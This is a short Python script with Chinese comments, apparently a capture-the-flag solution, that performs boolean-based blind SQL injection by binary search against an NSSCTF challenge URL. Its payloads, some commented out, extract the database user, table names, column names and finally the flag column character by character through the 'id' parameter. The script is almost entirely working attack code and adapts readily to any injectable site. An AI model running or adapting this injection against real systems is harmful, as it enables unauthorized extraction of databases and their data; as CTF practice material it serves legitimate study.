#布尔盲注脚本，二分法
import requests
url = 'http://node4.anna.nssctf.cn:28404/' #url
flag = ''

for i in range(1, 50):
    l,r = 32, 127
    while l < r:
        mid = (l+r) // 2
        # where id = 1
        #爆用户名
        #payload = f'2-if(ascii(substr((select user()), {i}, 1))<={mid}, 1, 0)'
        
        #爆表名  
        #payload = f'2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {i}, 1))<={mid}, 1, 0)'
        
        #爆列名
        # payload = f'2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'f1ag_table\'), {i}, 1))<={mid}, 1, 0)'
        
        #爆flag
        payload = f'2-if(ascii(substr((select group_concat(i_am_f1ag_column) from f1ag_table), {i}, 1))<={mid}, 1, 0)'
        """
        上面这行代码是关键，构造出来了执行命令的SQL语句，其中：
        利用二分法的关键是，如果此时的这个字符的ascii码小于等于mid，那么就会返回1，否则返回0
        """
        res = requests.get(url, params={
            'id': payload
        })
        #判断回显信息，输出这个字符结果，每道题的回显信息不同！
        if "id = 1" in res.text: # “id=1”是这个题的特点回显，如果成立就会出现id=1，不成立就不会出现
            r = mid
        else:
            l = mid+1
    flag += chr(l)
    print(flag)